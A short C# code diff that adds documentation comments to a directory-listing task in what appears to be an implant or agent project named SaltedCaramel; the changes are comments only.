@@ -9,8 +9,14 @@ using SaltedCaramel.Jobs;
 
 namespace SaltedCaramel.Tasks
 {
+    
     public class DirectoryList
     {
+        /// <summary>
+        /// List all files and directories.
+        /// </summary>
+        /// <param name="job">Job associated with this task. Path is in job.Task.@params</param>
+        /// <param name="agent">Agent this task is run on.</param>
         public static void Execute(Job job, SCImplant implant)
         {
             SCTask task = job.Task;
